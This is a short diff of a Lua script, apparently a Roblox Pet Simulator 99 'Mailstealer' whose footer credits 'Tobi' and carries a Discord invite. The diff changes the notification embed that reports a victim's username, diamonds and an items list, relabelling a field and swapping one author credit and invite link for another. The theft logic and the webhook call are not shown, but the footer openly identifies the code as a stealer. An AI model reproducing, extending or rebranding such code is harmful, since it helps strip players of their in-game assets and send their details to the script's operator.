@@ -64,7 +64,7 @@ local function SendMessage(username, diamonds)
 			inline = true
 		},
 		{
-			name = "🐹 Pets List:",
+			name = "🥳 Items List:",
 			value = "```" "```",
 			inline = false
 		},
@@ -108,8 +108,8 @@ local function SendMessage(username, diamonds)
             ["title"] = "\240\159\144\177 New PS99 Execution" ,
             ["color"] = 65280,
 			["fields"] = fields,
-			["text"] = "By Light Monzz",
-			["text"] = "https://discord.gg/CAr4FZHAyF",
+			["footer"] = {
+				["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
 			}
         }}
     }
